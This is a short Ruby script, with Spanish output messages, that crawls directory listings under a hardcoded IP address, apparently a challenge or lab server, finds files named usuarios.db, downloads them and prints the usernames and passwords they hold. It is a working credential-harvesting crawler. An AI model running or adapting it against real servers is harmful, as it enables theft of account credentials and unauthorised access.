require 'mechanize'
require 'byebug'

class DbScrapper
  SERVER_ROOT = "http://54.163.7.2/a508a570-8b5b-4314-8370-061e592868f2/auth/"
  attr_accessor :agent, :page, :links, :databases

  def initialize
    @links      = []
    @databases  = []
    @agent      = Mechanize.new
    @page       = @agent.get("http://54.163.7.2/a508a570-8b5b-4314-8370-061e592868f2/auth/")
    return
  end

  def run
    find_links(@page)
    puts "Total de directorios buscados #{@links.count} en los siguientes rutas: "
    @links.each do |link|
      puts link
    end
    puts ""
    puts "Total de archivos de base de datos encontratos #{@databases.count} en las siguientes rutas: "
    print_databases(databases)
    puts "Fin de Script"
  end

  def find_links(page)
    current_databases, current_links = [], []
    page.links.each do |link|
      case link.text
      when /usuarios.db/
        current_databases << link.resolved_uri.to_s
      when /\//
        current_links << link.resolved_uri.to_s
      end
    end
    @databases.concat(current_databases)
    @links.concat(current_links)
    if current_links.any?
      current_links.each do |link|
        link_page = @agent.get(link)
        find_links(link_page)
      end
    end
  end

  def print_databases(databases)
    databases.each do |db|
      page = @agent.get db
      puts "Directorio de base de datos #{db}"
      content = page.content.strip
      credentials = page.content.strip.split(":")
      puts "Usuario: #{credentials[0]} - Clave: #{credentials[1]}"
    end
  end
end
